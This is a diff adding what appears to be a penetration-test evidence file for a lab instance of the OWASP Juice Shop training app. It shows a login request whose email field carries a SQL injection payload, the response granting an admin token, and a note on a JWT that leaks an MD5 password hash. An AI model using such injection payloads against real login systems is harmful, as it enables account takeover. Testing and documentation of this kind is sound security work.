@@ -1,0 +1,16 @@
+### Request
+POST /rest/user/login HTTP/1.1
+Host: 192.168.100.10:3001
+Content-Type: application/json
+
+{"email":"' OR 1=1--","password":"x"}
+
+### Response
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+
+{"authentication":{"token":"<JWT - see note>","bid":1,"umail":"admin@juice-sh.op"}}
+
+Note: JWT payload (base64-decoded) contains the authenticated user's record,
+including field "password":"0192023a7bbd7325051 6f069df18b500" (an MD5 hash).
+This is a secondary finding (F-004): sensitive data exposure via JWT claims.
